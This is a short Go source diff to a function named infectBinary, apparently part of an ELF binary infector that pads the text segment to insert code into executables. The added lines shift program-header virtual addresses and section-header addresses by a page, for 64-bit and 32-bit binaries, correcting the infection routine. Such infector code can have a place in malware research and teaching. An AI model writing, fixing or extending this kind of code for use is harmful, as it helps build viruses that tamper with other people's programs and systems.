@@ -239,6 +239,7 @@ func (t *targetBin) infectBinary(debug bool, noRestoration bool, noRetOEP bool) 
 					fmt.Printf(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
 				}
 				t.Phdrs.([]elf.Prog64)[j].Off += uint64(PAGE_SIZE)
+				t.Phdrs.([]elf.Prog64)[j].Vaddr += uint64(PAGE_SIZE)
 			}
 		}
 
@@ -254,6 +255,7 @@ func (t *targetBin) infectBinary(debug bool, noRestoration bool, noRetOEP bool) 
 					fmt.Printf(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
 				}
 				t.Shdrs.([]elf.Section64)[k].Off += uint64(PAGE_SIZE)
+				t.Shdrs.([]elf.Section64)[k].Addr += uint64(PAGE_SIZE)
 			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header64).Entry {
 				if debug {
 					fmt.Println(EXTEND_SECTION_HEADER_ENTRY)
@@ -319,6 +321,7 @@ func (t *targetBin) infectBinary(debug bool, noRestoration bool, noRetOEP bool) 
 					fmt.Printf(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
 				}
 				t.Phdrs.([]elf.Prog32)[j].Off += uint32(PAGE_SIZE)
+				t.Phdrs.([]elf.Prog32)[j].Vaddr += uint32(PAGE_SIZE)
 			}
 		}
 
@@ -334,6 +337,7 @@ func (t *targetBin) infectBinary(debug bool, noRestoration bool, noRetOEP bool) 
 					fmt.Printf(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
 				}
 				t.Shdrs.([]elf.Section32)[k].Off += uint32(PAGE_SIZE)
+				t.Shdrs.([]elf.Section32)[k].Addr += uint32(PAGE_SIZE)
 			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header32).Entry {
 				if debug {
 					fmt.Println(EXTEND_SECTION_HEADER_ENTRY)
